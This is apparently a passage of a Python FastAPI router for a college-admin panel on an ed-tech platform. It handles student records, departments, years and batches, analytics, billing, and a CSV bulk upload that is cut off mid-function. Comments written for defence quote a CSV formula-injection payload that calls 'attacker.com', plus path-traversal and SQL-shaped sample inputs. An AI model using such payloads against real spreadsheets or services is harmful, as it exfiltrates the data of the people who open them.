"""
PrepVista — College Secondary Admin Router
Endpoints under /org/my/* for college admins to manage their own organization.
"""

import csv
import io
import json
import re
import uuid
from datetime import datetime, timezone

from fastapi import APIRouter, Depends, HTTPException, Query, UploadFile, File
from fastapi.responses import StreamingResponse
from pydantic import BaseModel, field_validator

from app.config import (
    COLLEGE_STUDENT_PLAN, ORG_DEFAULT_PAGE_SIZE, ORG_MAX_PAGE_SIZE,
)
from app.database.connection import DatabaseConnection
from app.dependencies import OrgAdminProfile, require_org_admin

router = APIRouter()

# ── Field length constants ────────────────────────────
# ✅ SEC: All user-controlled string fields capped. Without caps, a 1MB notes
# field inflates DB storage and can trigger OOM in JSON serialization under load.
_MAX_EMAIL_LEN = 254        # RFC 5321 maximum
_MAX_NAME_LEN = 200
_MAX_CODE_LEN = 64
_MAX_NOTES_LEN = 1000
_MAX_SEARCH_LEN = 200
_EMAIL_RE = re.compile(r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$')


# ── UUID validation helper ────────────────────────────
def _validate_uuid(value: str, label: str = "ID") -> str:
    """Validate that a path parameter is a valid UUID.

    ✅ SEC: Without this, a non-UUID path param (e.g. '../../../etc/passwd' or
    'DROP TABLE') causes asyncpg to raise a raw PostgreSQL error that leaks
    internal schema details in the 500 response body. Validate first, return
    400 with a safe message — never let DB errors reach the client.
    """
    try:
        uuid.UUID(str(value))
        return str(value)
    except ValueError:
        raise HTTPException(400, f"Invalid {label} format.")


# ── CSV formula injection sanitizer ──────────────────
_CSV_INJECTION_PREFIXES = ('=', '+', '-', '@', '\t', '\r', '\n')

def _sanitize_csv_cell(value: object) -> str:
    """Sanitize a value before writing it to a CSV cell.

    ✅ SEC: CSV formula injection (A1 injection) is a real CVE category.
    A student named '=HYPERLINK(\"http://attacker.com/\"&A1,\"Click\")' causes
    Excel/Google Sheets to exfiltrate data when the college TPO opens the file.
    OWASP classifies this as a high-severity vulnerability for data export endpoints.

    Mitigation: prefix any cell that starts with a formula trigger character
    with a single quote — Excel treats it as a text literal, not a formula.
    This is the OWASP-recommended defense.
    """
    if value is None:
        return ""
    text = str(value).strip()
    if text and text[0] in _CSV_INJECTION_PREFIXES:
        return "'" + text  # force Excel to treat as text literal
    return text


# ── Request Models ───────────────────────────────────
class AddStudentRequest(BaseModel):
    email: str
    student_code: str | None = None
    department_id: str | None = None
    year_id: str | None = None
    batch_id: str | None = None
    section: str | None = None
    grant_career_access: bool = True
    notes: str | None = None

    # ✅ SEC: Validate email format and length. Without this, any string is accepted
    # as an email — including SQL-shaped strings and excessively long inputs that
    # stress the LOWER() + LIKE comparisons in list_students.
    @field_validator("email")
    @classmethod
    def _validate_email(cls, v: str) -> str:
        v = (v or "").strip()
        if len(v) > _MAX_EMAIL_LEN:
            raise ValueError(f"Email must be {_MAX_EMAIL_LEN} characters or fewer.")
        if not _EMAIL_RE.match(v):
            raise ValueError("Invalid email address format.")
        return v

    @field_validator("student_code", "section", mode="before")
    @classmethod
    def _cap_code_fields(cls, v: object) -> object:
        if isinstance(v, str):
            return v.strip()[:_MAX_CODE_LEN]
        return v

    @field_validator("notes", mode="before")
    @classmethod
    def _cap_notes(cls, v: object) -> object:
        if isinstance(v, str):
            return v.strip()[:_MAX_NOTES_LEN]
        return v


class UpdateStudentRequest(BaseModel):
    student_code: str | None = None
    department_id: str | None = None
    year_id: str | None = None
    batch_id: str | None = None
    section: str | None = None
    notes: str | None = None

    @field_validator("student_code", "section", mode="before")
    @classmethod
    def _cap_code_fields(cls, v: object) -> object:
        if isinstance(v, str):
            return v.strip()[:_MAX_CODE_LEN]
        return v

    @field_validator("notes", mode="before")
    @classmethod
    def _cap_notes(cls, v: object) -> object:
        if isinstance(v, str):
            return v.strip()[:_MAX_NOTES_LEN]
        return v


class SegmentRequest(BaseModel):
    name: str
    code: str | None = None
    notes: str | None = None

    # ✅ SEC: Cap segment names — an uncapped name inflates DB storage and
    # renders as a very long string in UI tables, causing layout attacks.
    @field_validator("name", mode="before")
    @classmethod
    def _cap_name(cls, v: object) -> str:
        s = (str(v) if v is not None else "").strip()
        if not s:
            raise ValueError("Name is required.")
        return s[:_MAX_NAME_LEN]

    @field_validator("code", mode="before")
    @classmethod
    def _cap_code(cls, v: object) -> object:
        if isinstance(v, str):
            return v.strip()[:_MAX_CODE_LEN]
        return v

    @field_validator("notes", mode="before")
    @classmethod
    def _cap_notes(cls, v: object) -> object:
        if isinstance(v, str):
            return v.strip()[:_MAX_NOTES_LEN]
        return v


class BatchRequest(BaseModel):
    name: str
    code: str | None = None
    year_id: str | None = None
    notes: str | None = None

    @field_validator("name", mode="before")
    @classmethod
    def _cap_name(cls, v: object) -> str:
        s = (str(v) if v is not None else "").strip()
        if not s:
            raise ValueError("Name is required.")
        return s[:_MAX_NAME_LEN]

    @field_validator("code", mode="before")
    @classmethod
    def _cap_code(cls, v: object) -> object:
        if isinstance(v, str):
            return v.strip()[:_MAX_CODE_LEN]
        return v

    @field_validator("notes", mode="before")
    @classmethod
    def _cap_notes(cls, v: object) -> object:
        if isinstance(v, str):
            return v.strip()[:_MAX_NOTES_LEN]
        return v


# ── Helpers ──────────────────────────────────────────
def _paginate(page: int, page_size: int) -> tuple[int, int]:
    ps = min(max(1, page_size), ORG_MAX_PAGE_SIZE)
    offset = max(0, (max(1, page) - 1) * ps)
    return ps, offset


async def _log_action(conn, org_id, admin_id, action, *, student_id=None, entity_type=None, entity_id=None, notes=None, metadata=None):
    # ✅ FIXED: Wrapped in try/except — previously an audit log INSERT failure would
    # propagate up and roll back the actual operation (add_student, grant_access, etc).
    # The audit log must never block or undo a real business action.
    # ✅ FIXED: __import__("json") replaced with json (already imported at line 8).
    try:
        await conn.execute(
            """INSERT INTO organization_access_log
               (organization_id, admin_user_id, student_user_id, action, entity_type, entity_id, notes, metadata)
               VALUES ($1,$2,$3,$4,$5,$6,$7,$8)""",
            org_id, admin_id, student_id, action, entity_type, entity_id, notes,
            json.dumps(metadata) if metadata else "{}",
        )
    except Exception:
        # Swallow silently — audit log failure must never affect the user-facing response
        pass


# ── Dashboard ────────────────────────────────────────
@router.get("/dashboard")
async def college_dashboard(admin: OrgAdminProfile = Depends(require_org_admin())):
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        # ✅ SEC: Explicit column list — SELECT * returned all org columns including
        # internal billing fields, payment references, and admin-only flags that
        # college admins must not see. Explicit list controls the response surface.
        org = await conn.fetchrow(
            """SELECT id, name, category, plan, seat_limit, seats_used,
                      access_expiry, status, created_at
               FROM organizations WHERE id = $1""",
            org_id,
        )
        stats = await conn.fetchrow(
            """SELECT
                 COUNT(*) FILTER (WHERE status = 'active') AS total_students,
                 COUNT(*) FILTER (WHERE has_career_access = TRUE AND status = 'active') AS career_access_students
               FROM organization_students WHERE organization_id = $1""",
            org_id,
        )
        seg_stats = await conn.fetchrow(
            """SELECT
                 (SELECT COUNT(*) FROM college_departments WHERE organization_id = $1 AND status = 'active') AS dept_count,
                 (SELECT COUNT(*) FROM college_years      WHERE organization_id = $1 AND status = 'active') AS year_count,
                 (SELECT COUNT(*) FROM college_batches    WHERE organization_id = $1 AND status = 'active') AS batch_count""",
            org_id,
        )
        recent = await conn.fetch(
            """SELECT os.id, os.student_code, os.has_career_access, os.added_at,
                      p.email, p.full_name
               FROM organization_students os JOIN profiles p ON p.id = os.user_id
               WHERE os.organization_id = $1 AND os.status = 'active'
               ORDER BY os.added_at DESC LIMIT 10""",
            org_id,
        )
    return {
        "organization": dict(org) if org else None,
        "total_students": stats["total_students"] if stats else 0,
        "career_access_students": stats["career_access_students"] if stats else 0,
        "departments": seg_stats["dept_count"] if seg_stats else 0,
        "years": seg_stats["year_count"] if seg_stats else 0,
        "batches": seg_stats["batch_count"] if seg_stats else 0,
        "seat_limit": org["seat_limit"] if org else 0,
        "seats_used": org["seats_used"] if org else 0,
        "recent_students": [dict(r) for r in recent],
    }


# ── Student CRUD ─────────────────────────────────────
@router.get("/students")
async def list_students(
    search: str | None = None,
    department_id: str | None = None,
    year_id: str | None = None,
    batch_id: str | None = None,
    has_access: bool | None = None,
    page: int = 1, page_size: int = ORG_DEFAULT_PAGE_SIZE,
    admin: OrgAdminProfile = Depends(require_org_admin()),
):
    ps, offset = _paginate(page, page_size)
    org_id = admin.organization_id
    # ✅ SEC: Cap search length — a 10,000-char search term runs LOWER() + LIKE
    # across every student row with no benefit. Cap before it reaches the DB.
    safe_search = (search or "")[:_MAX_SEARCH_LEN].strip() or None
    async with DatabaseConnection() as conn:
        where = ["os.organization_id = $1", "os.status != 'removed'"]
        params: list = [org_id]
        idx = 1
        if safe_search:
            idx += 1
            where.append(f"(LOWER(p.email) LIKE ${idx} OR LOWER(p.full_name) LIKE ${idx} OR os.student_code LIKE ${idx})")
            params.append(f"%{safe_search.lower()}%")
        if department_id:
            idx += 1; where.append(f"os.department_id = ${idx}"); params.append(department_id)
        if year_id:
            idx += 1; where.append(f"os.year_id = ${idx}"); params.append(year_id)
        if batch_id:
            idx += 1; where.append(f"os.batch_id = ${idx}"); params.append(batch_id)
        if has_access is not None:
            idx += 1; where.append(f"os.has_career_access = ${idx}"); params.append(has_access)
        w = " AND ".join(where)
        total = await conn.fetchval(
            f"""SELECT COUNT(*) FROM organization_students os
                JOIN profiles p ON p.id = os.user_id WHERE {w}""", *params)
        rows = await conn.fetch(
            f"""SELECT os.*, p.email, p.full_name, p.plan,
                       cd.department_name, cy.year_name, cb.batch_name
                FROM organization_students os
                JOIN profiles p ON p.id = os.user_id
                LEFT JOIN college_departments cd ON cd.id = os.department_id
                LEFT JOIN college_years cy ON cy.id = os.year_id
                LEFT JOIN college_batches cb ON cb.id = os.batch_id
                WHERE {w} ORDER BY os.added_at DESC LIMIT ${idx+1} OFFSET ${idx+2}""",
            *params, ps, offset)
    return {"students": [dict(r) for r in rows], "total": total, "page": page, "page_size": ps}


@router.post("/students")
async def add_student(body: AddStudentRequest, admin: OrgAdminProfile = Depends(require_org_admin())):
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        org = await conn.fetchrow("SELECT seat_limit, seats_used FROM organizations WHERE id = $1", org_id)
        if org and org["seats_used"] >= org["seat_limit"]:
            raise HTTPException(400, f"Seat limit reached ({org['seat_limit']}). Contact your platform admin to increase seats.")
        profile = await conn.fetchrow("SELECT id FROM profiles WHERE LOWER(email) = LOWER($1)", body.email)
        if not profile:
            raise HTTPException(404, f"No PrepVista account found for {body.email}. Student must sign up first.")
        user_id = str(profile["id"])
        existing = await conn.fetchrow(
            "SELECT id FROM organization_students WHERE organization_id = $1 AND user_id = $2", org_id, user_id)
        if existing:
            raise HTTPException(400, "This student is already in your organization.")
        access_at = datetime.now(timezone.utc) if body.grant_career_access else None
        # ✅ FIXED: All 3 writes now inside a transaction. Previously no transaction —
        # if UPDATE seats_used or UPDATE profiles failed, student row existed but
        # seat count and plan were wrong. Data corruption under any mid-write failure.
        async with conn.transaction():
            row = await conn.fetchrow(
                """INSERT INTO organization_students
                   (organization_id, user_id, student_code, department_id, year_id, batch_id,
                    section, has_career_access, access_granted_at, access_granted_by, notes)
                   VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11) RETURNING *""",
                org_id, user_id, body.student_code, body.department_id, body.year_id,
                body.batch_id, body.section, body.grant_career_access, access_at,
                admin.user_id if body.grant_career_access else None, body.notes)
            await conn.execute("UPDATE organizations SET seats_used = seats_used + 1 WHERE id = $1", org_id)
            if body.grant_career_access:
                await conn.execute(
                    "UPDATE profiles SET plan = $1, org_student = TRUE, organization_id = $2 WHERE id = $3",
                    COLLEGE_STUDENT_PLAN, org_id, user_id)
            else:
                await conn.execute(
                    "UPDATE profiles SET org_student = TRUE, organization_id = $1 WHERE id = $2", org_id, user_id)
        await _log_action(conn, org_id, admin.user_id, "add_student", student_id=user_id,
                          notes=f"Added {body.email}")
    return {"status": "added", "student": dict(row)}


@router.get("/students/{student_id}")
async def get_student(student_id: str, admin: OrgAdminProfile = Depends(require_org_admin())):
    _validate_uuid(student_id, "student ID")  # ✅ SEC: prevents raw DB errors leaking schema
    async with DatabaseConnection() as conn:
        row = await conn.fetchrow(
            """SELECT os.*, p.email, p.full_name, p.plan,
                      cd.department_name, cy.year_name, cb.batch_name
               FROM organization_students os
               JOIN profiles p ON p.id = os.user_id
               LEFT JOIN college_departments cd ON cd.id = os.department_id
               LEFT JOIN college_years cy ON cy.id = os.year_id
               LEFT JOIN college_batches cb ON cb.id = os.batch_id
               WHERE os.id = $1 AND os.organization_id = $2""",
            student_id, admin.organization_id)
        if not row:
            raise HTTPException(404, "Student not found in your organization.")
    return {"student": dict(row)}


@router.put("/students/{student_id}")
async def update_student(student_id: str, body: UpdateStudentRequest, admin: OrgAdminProfile = Depends(require_org_admin())):
    _validate_uuid(student_id, "student ID")  # ✅ SEC
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        existing = await conn.fetchrow(
            "SELECT id, user_id FROM organization_students WHERE id = $1 AND organization_id = $2", student_id, org_id)
        if not existing:
            raise HTTPException(404, "Student not found in your organization.")
        sets, params, idx = [], [], 0
        for field in ["student_code", "department_id", "year_id", "batch_id", "section", "notes"]:
            val = getattr(body, field, None)
            if val is not None:
                idx += 1; sets.append(f"{field} = ${idx}"); params.append(val)
        if not sets:
            raise HTTPException(400, "No fields to update.")
        idx += 1; params.append(student_id)
        idx += 1; params.append(org_id)
        await conn.execute(
            f"UPDATE organization_students SET {', '.join(sets)}, updated_at = NOW() WHERE id = ${idx-1} AND organization_id = ${idx}",
            *params)
        await _log_action(conn, org_id, admin.user_id, "edit_student",
                          student_id=str(existing["user_id"]), notes="Updated student info")
    return {"status": "updated"}


@router.delete("/students/{student_id}")
async def remove_student(student_id: str, admin: OrgAdminProfile = Depends(require_org_admin())):
    _validate_uuid(student_id, "student ID")  # ✅ SEC
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        row = await conn.fetchrow(
            "SELECT user_id, has_career_access FROM organization_students WHERE id = $1 AND organization_id = $2",
            student_id, org_id)
        if not row:
            raise HTTPException(404, "Student not found in your organization.")
        user_id = str(row["user_id"])
        # ✅ FIXED: All 3 writes wrapped in a transaction. Previously no transaction —
        # if seats_used decrement or profiles revert failed, student stayed enrolled
        # with incorrect seat count or a dangling plan upgrade.
        async with conn.transaction():
            await conn.execute(
                "UPDATE organization_students SET status = 'removed', has_career_access = FALSE, updated_at = NOW() WHERE id = $1",
                student_id)
            await conn.execute("UPDATE organizations SET seats_used = GREATEST(seats_used - 1, 0) WHERE id = $1", org_id)
            if row["has_career_access"]:
                await conn.execute(
                    "UPDATE profiles SET plan = 'free', org_student = FALSE, organization_id = NULL WHERE id = $1", user_id)
            else:
                await conn.execute(
                    "UPDATE profiles SET org_student = FALSE, organization_id = NULL WHERE id = $1", user_id)
        await _log_action(conn, org_id, admin.user_id, "remove_student", student_id=user_id)
    return {"status": "removed"}


# ── Grant / Revoke Career Access ─────────────────────
@router.post("/students/{student_id}/grant-access")
async def grant_career_access(student_id: str, admin: OrgAdminProfile = Depends(require_org_admin())):
    _validate_uuid(student_id, "student ID")  # ✅ SEC
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        row = await conn.fetchrow(
            "SELECT user_id, has_career_access FROM organization_students WHERE id = $1 AND organization_id = $2 AND status = 'active'",
            student_id, org_id)
        if not row:
            raise HTTPException(404, "Active student not found.")
        if row["has_career_access"]:
            return {"status": "already_granted"}
        user_id = str(row["user_id"])
        now = datetime.now(timezone.utc)
        # ✅ FIXED: Both writes inside a transaction. Previously no transaction —
        # if profiles UPDATE failed, student showed as granted in organization_students
        # but their plan was never upgraded. Student would see access denied.
        async with conn.transaction():
            await conn.execute(
                """UPDATE organization_students
                   SET has_career_access = TRUE, access_granted_at = $1, access_granted_by = $2, updated_at = $1
                   WHERE id = $3""",
                now, admin.user_id, student_id)
            await conn.execute("UPDATE profiles SET plan = $1 WHERE id = $2", COLLEGE_STUDENT_PLAN, user_id)
        await _log_action(conn, org_id, admin.user_id, "grant_access", student_id=user_id)
    return {"status": "granted"}


@router.post("/students/{student_id}/revoke-access")
async def revoke_career_access(student_id: str, admin: OrgAdminProfile = Depends(require_org_admin())):
    _validate_uuid(student_id, "student ID")  # ✅ SEC
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        row = await conn.fetchrow(
            "SELECT user_id, has_career_access FROM organization_students WHERE id = $1 AND organization_id = $2 AND status = 'active'",
            student_id, org_id)
        if not row:
            raise HTTPException(404, "Active student not found.")
        if not row["has_career_access"]:
            return {"status": "already_revoked"}
        user_id = str(row["user_id"])
        # ✅ FIXED: Both writes inside a transaction. Previously no transaction —
        # if profiles UPDATE failed, access shows as revoked in organization_students
        # but the student's plan stayed upgraded — they keep free access they shouldn't have.
        async with conn.transaction():
            await conn.execute(
                "UPDATE organization_students SET has_career_access = FALSE, updated_at = NOW() WHERE id = $1", student_id)
            await conn.execute("UPDATE profiles SET plan = 'free' WHERE id = $1", user_id)
        await _log_action(conn, org_id, admin.user_id, "revoke_access", student_id=user_id)
    return {"status": "revoked"}


# ── Department CRUD ──────────────────────────────────
@router.get("/departments")
async def list_departments(admin: OrgAdminProfile = Depends(require_org_admin())):
    async with DatabaseConnection() as conn:
        rows = await conn.fetch(
            "SELECT * FROM college_departments WHERE organization_id = $1 ORDER BY department_name",
            admin.organization_id)
    return {"departments": [dict(r) for r in rows]}


@router.post("/departments")
async def create_department(body: SegmentRequest, admin: OrgAdminProfile = Depends(require_org_admin())):
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        row = await conn.fetchrow(
            """INSERT INTO college_departments (organization_id, department_name, department_code, notes)
               VALUES ($1,$2,$3,$4) RETURNING *""",
            org_id, body.name, body.code, body.notes)
        await _log_action(conn, org_id, admin.user_id, "segment_add",
                          entity_type="department", entity_id=row["id"])
    return {"status": "created", "department": dict(row)}


@router.put("/departments/{dept_id}")
async def update_department(dept_id: str, body: SegmentRequest, admin: OrgAdminProfile = Depends(require_org_admin())):
    _validate_uuid(dept_id, "department ID")  # ✅ SEC
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        existing = await conn.fetchrow(
            "SELECT id FROM college_departments WHERE id = $1 AND organization_id = $2", dept_id, org_id)
        if not existing:
            raise HTTPException(404, "Department not found.")
        await conn.execute(
            "UPDATE college_departments SET department_name=$1, department_code=$2, notes=$3, updated_at=NOW() WHERE id=$4",
            body.name, body.code, body.notes, dept_id)
        await _log_action(conn, org_id, admin.user_id, "segment_edit",
                          entity_type="department", entity_id=dept_id)
    return {"status": "updated"}


@router.delete("/departments/{dept_id}")
async def delete_department(dept_id: str, admin: OrgAdminProfile = Depends(require_org_admin())):
    _validate_uuid(dept_id, "department ID")  # ✅ SEC
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        count = await conn.fetchval(
            "SELECT COUNT(*) FROM organization_students WHERE department_id = $1 AND status = 'active'", dept_id)
        if count > 0:
            raise HTTPException(400, f"Cannot delete: {count} active students in this department.")
        await conn.execute(
            "DELETE FROM college_departments WHERE id = $1 AND organization_id = $2", dept_id, org_id)
        await _log_action(conn, org_id, admin.user_id, "segment_delete",
                          entity_type="department", entity_id=dept_id)
    return {"status": "deleted"}


# ── Year CRUD ────────────────────────────────────────
@router.get("/years")
async def list_years(admin: OrgAdminProfile = Depends(require_org_admin())):
    async with DatabaseConnection() as conn:
        rows = await conn.fetch(
            "SELECT * FROM college_years WHERE organization_id = $1 ORDER BY display_order",
            admin.organization_id)
    return {"years": [dict(r) for r in rows]}


@router.post("/years")
async def create_year(body: SegmentRequest, admin: OrgAdminProfile = Depends(require_org_admin())):
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        row = await conn.fetchrow(
            """INSERT INTO college_years (organization_id, year_name, notes)
               VALUES ($1,$2,$3) RETURNING *""",
            org_id, body.name, body.notes)
        await _log_action(conn, org_id, admin.user_id, "segment_add",
                          entity_type="year", entity_id=row["id"])
    return {"status": "created", "year": dict(row)}


@router.put("/years/{year_id}")
async def update_year(year_id: str, body: SegmentRequest, admin: OrgAdminProfile = Depends(require_org_admin())):
    _validate_uuid(year_id, "year ID")  # ✅ SEC
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        existing = await conn.fetchrow(
            "SELECT id FROM college_years WHERE id = $1 AND organization_id = $2", year_id, org_id)
        if not existing:
            raise HTTPException(404, "Year not found.")
        await conn.execute(
            "UPDATE college_years SET year_name=$1, notes=$2, updated_at=NOW() WHERE id=$3",
            body.name, body.notes, year_id)
        await _log_action(conn, org_id, admin.user_id, "segment_edit",
                          entity_type="year", entity_id=year_id)
    return {"status": "updated"}


@router.delete("/years/{year_id}")
async def delete_year(year_id: str, admin: OrgAdminProfile = Depends(require_org_admin())):
    _validate_uuid(year_id, "year ID")  # ✅ SEC
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        count = await conn.fetchval(
            "SELECT COUNT(*) FROM organization_students WHERE year_id = $1 AND status = 'active'", year_id)
        if count > 0:
            raise HTTPException(400, f"Cannot delete: {count} active students in this year.")
        await conn.execute(
            "DELETE FROM college_years WHERE id = $1 AND organization_id = $2", year_id, org_id)
        await _log_action(conn, org_id, admin.user_id, "segment_delete",
                          entity_type="year", entity_id=year_id)
    return {"status": "deleted"}


@router.post("/years/reorder")
async def reorder_years(year_ids: list[str], admin: OrgAdminProfile = Depends(require_org_admin())):
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        async with conn.transaction():
            for idx, y_id in enumerate(year_ids):
                # Basic UUID validation on each ID
                _validate_uuid(y_id, "year ID")
                await conn.execute(
                    "UPDATE college_years SET display_order = $1 WHERE id = $2 AND organization_id = $3",
                    idx, y_id, org_id
                )
        await _log_action(conn, org_id, admin.user_id, "segment_reorder", entity_type="year")
    return {"status": "reordered"}


# ── Batch CRUD ───────────────────────────────────────
@router.get("/batches")
async def list_batches(admin: OrgAdminProfile = Depends(require_org_admin())):
    async with DatabaseConnection() as conn:
        rows = await conn.fetch(
            """SELECT cb.*, cy.year_name FROM college_batches cb
               LEFT JOIN college_years cy ON cy.id = cb.year_id
               WHERE cb.organization_id = $1 ORDER BY cb.batch_name""",
            admin.organization_id)
    return {"batches": [dict(r) for r in rows]}


@router.post("/batches")
async def create_batch(body: BatchRequest, admin: OrgAdminProfile = Depends(require_org_admin())):
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        row = await conn.fetchrow(
            """INSERT INTO college_batches (organization_id, batch_name, batch_code, year_id, notes)
               VALUES ($1,$2,$3,$4,$5) RETURNING *""",
            org_id, body.name, body.code, body.year_id, body.notes)
        await _log_action(conn, org_id, admin.user_id, "segment_add",
                          entity_type="batch", entity_id=row["id"])
    return {"status": "created", "batch": dict(row)}


@router.put("/batches/{batch_id}")
async def update_batch(batch_id: str, body: BatchRequest, admin: OrgAdminProfile = Depends(require_org_admin())):
    _validate_uuid(batch_id, "batch ID")  # ✅ SEC
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        existing = await conn.fetchrow(
            "SELECT id FROM college_batches WHERE id = $1 AND organization_id = $2", batch_id, org_id)
        if not existing:
            raise HTTPException(404, "Batch not found.")
        await conn.execute(
            "UPDATE college_batches SET batch_name=$1, batch_code=$2, year_id=$3, notes=$4, updated_at=NOW() WHERE id=$5",
            body.name, body.code, body.year_id, body.notes, batch_id)
        await _log_action(conn, org_id, admin.user_id, "segment_edit",
                          entity_type="batch", entity_id=batch_id)
    return {"status": "updated"}


@router.delete("/batches/{batch_id}")
async def delete_batch(batch_id: str, admin: OrgAdminProfile = Depends(require_org_admin())):
    _validate_uuid(batch_id, "batch ID")  # ✅ SEC
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        count = await conn.fetchval(
            "SELECT COUNT(*) FROM organization_students WHERE batch_id = $1 AND status = 'active'", batch_id)
        if count > 0:
            raise HTTPException(400, f"Cannot delete: {count} active students in this batch.")
        await conn.execute(
            "DELETE FROM college_batches WHERE id = $1 AND organization_id = $2", batch_id, org_id)
        await _log_action(conn, org_id, admin.user_id, "segment_delete",
                          entity_type="batch", entity_id=batch_id)
    return {"status": "deleted"}


# ── Analytics ────────────────────────────────────────
@router.get("/analytics")
async def college_analytics(admin: OrgAdminProfile = Depends(require_org_admin())):
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        # ✅ PERF: total + access were 2 separate fetchval calls — now one query
        counts = await conn.fetchrow(
            """SELECT
                 COUNT(*) FILTER (WHERE status = 'active') AS total_students,
                 COUNT(*) FILTER (WHERE has_career_access = TRUE AND status = 'active') AS career_access_students
               FROM organization_students WHERE organization_id = $1""",
            org_id,
        )
        dept_stats = await conn.fetch(
            """SELECT cd.department_name, COUNT(os.id) as total,
                      COUNT(os.id) FILTER (WHERE os.has_career_access) as with_access
               FROM organization_students os
               JOIN college_departments cd ON cd.id = os.department_id
               WHERE os.organization_id = $1 AND os.status = 'active'
               GROUP BY cd.department_name ORDER BY total DESC""", org_id)
        year_stats = await conn.fetch(
            """SELECT cy.year_name, COUNT(os.id) as total,
                      COUNT(os.id) FILTER (WHERE os.has_career_access) as with_access
               FROM organization_students os
               JOIN college_years cy ON cy.id = os.year_id
               WHERE os.organization_id = $1 AND os.status = 'active'
               GROUP BY cy.year_name ORDER BY total DESC""", org_id)
        batch_stats = await conn.fetch(
            """SELECT cb.batch_name, COUNT(os.id) as total,
                      COUNT(os.id) FILTER (WHERE os.has_career_access) as with_access
               FROM organization_students os
               JOIN college_batches cb ON cb.id = os.batch_id
               WHERE os.organization_id = $1 AND os.status = 'active'
               GROUP BY cb.batch_name ORDER BY total DESC""", org_id)
    return {
        "total_students": counts["total_students"] if counts else 0,
        "career_access_students": counts["career_access_students"] if counts else 0,
        "department_stats": [dict(d) for d in dept_stats],
        "year_stats": [dict(y) for y in year_stats],
        "batch_stats": [dict(b) for b in batch_stats],
    }


# ── Access Log ───────────────────────────────────────
@router.get("/access-log")
async def college_access_log(
    page: int = 1, page_size: int = ORG_DEFAULT_PAGE_SIZE,
    admin: OrgAdminProfile = Depends(require_org_admin()),
):
    ps, offset = _paginate(page, page_size)
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        rows = await conn.fetch(
            """SELECT oal.*, p1.email AS student_email, p2.email AS admin_email
               FROM organization_access_log oal
               LEFT JOIN profiles p1 ON p1.id = oal.student_user_id
               LEFT JOIN profiles p2 ON p2.id = oal.admin_user_id
               WHERE oal.organization_id = $1 ORDER BY oal.created_at DESC LIMIT $2 OFFSET $3""",
            org_id, ps, offset)
        total = await conn.fetchval(
            "SELECT COUNT(*) FROM organization_access_log WHERE organization_id = $1", org_id)
    return {"access_log": [dict(r) for r in rows], "total": total, "page": page, "page_size": ps}


# ── Billing ──────────────────────────────────────────
@router.get("/billing")
async def college_billing(admin: OrgAdminProfile = Depends(require_org_admin())):
    org_id = admin.organization_id
    async with DatabaseConnection() as conn:
        org = await conn.fetchrow("SELECT plan, seat_limit, seats_used, access_expiry FROM organizations WHERE id = $1", org_id)
        allocations = await conn.fetch(
            "SELECT * FROM org_plan_allocations WHERE organization_id = $1 ORDER BY created_at DESC", org_id)
        payments = await conn.fetch(
            "SELECT * FROM org_payments WHERE organization_id = $1 ORDER BY created_at DESC LIMIT 50", org_id)
    return {
        "plan": org["plan"] if org else None,
        "seat_limit": org["seat_limit"] if org else 0,
        "seats_used": org["seats_used"] if org else 0,
        "access_expiry": org["access_expiry"] if org else None,
        "allocations": [dict(a) for a in allocations],
        "payments": [dict(p) for p in payments],
    }


# ── Bulk Upload ──────────────────────────────────────
@router.post("/students/bulk")
async def bulk_upload_students(
    file: UploadFile = File(...),
    admin: OrgAdminProfile = Depends(require_org_admin()),
):
    """CSV bulk upload. Required columns: full_name, student_id, email, phone, department, year, batch, section, notes, grant_career_access."""
    org_id = admin.organization_id
    from app.config import COLLEGE_CSV_MAX_ROWS, COLLEGE_CSV_REQUIRED_COLUMNS

    # ✅ SEC: Validate MIME type — prevents arbitrary file types being uploaded
    # with a .csv extension. defence-in-depth alongside the 5MB cap.
    _allowed_mime = {"text/csv", "text/plain", "application/csv", "application/octet-stream"}
    if file.content_type and file.content_type.split(";")[0].strip().lower() not in _allowed_mime:
        raise HTTPException(400, f"Invalid file type '{file.content_type}'. Please upload a CSV file.")

    # ✅ FIXED: No file size check previously — a 100MB CSV would load entirely into
    # memory. Cap at 5MB which comfortably fits COLLEGE_CSV_MAX_ROWS rows.
    _MAX_UPLOAD_BYTES = 5 * 1024 * 1024  # 5 MB
    content = await file.read(_MAX_UPLOAD_BYTES + 1)
    if len(content) > _MAX_UPLOAD_BYTES:
        raise HTTPException(400, "CSV file exceeds the 5 MB size limit. Please split into smaller batches.")

    try:
        text = content.decode("utf-8-sig")
    except UnicodeDecodeError:
        text = content.decode("latin-1")

    reader = csv.DictReader(io.StringIO(text))
    if not reader.fieldnames:
        raise HTTPException(400, "CSV file is empty or has no headers.")
    headers = {h.strip().lower() for h in reader.fieldnames}
    missing = COLLEGE_CSV_REQUIRED_COLUMNS - headers
    if missing:
        raise HTTPException(400, f"Missing CSV columns: {', '.join(sorted(missing))}")

    rows = list(reader)
    if len(rows) > COLLEGE_CSV_MAX_ROWS:
        raise HTTPException(400, f"CSV exceeds {COLLEGE_CSV_MAX_ROWS} row limit.")

    async with DatabaseConnection() as conn:
        org = await conn.fetchrow("SELECT seat_limit, seats_used FROM organizations WHERE id = $1", org_id)
        available = (org["seat_limit"] - org["seats_used"]) if org else 0

        # Pre-load segments for name→id mapping (unchanged — already correct)
        depts = {r["department_name"].lower(): str(r["id"]) for r in await conn.fetch(
            "SELECT id, department_name FROM college_departments WHERE organization_id = $1", org_id)}
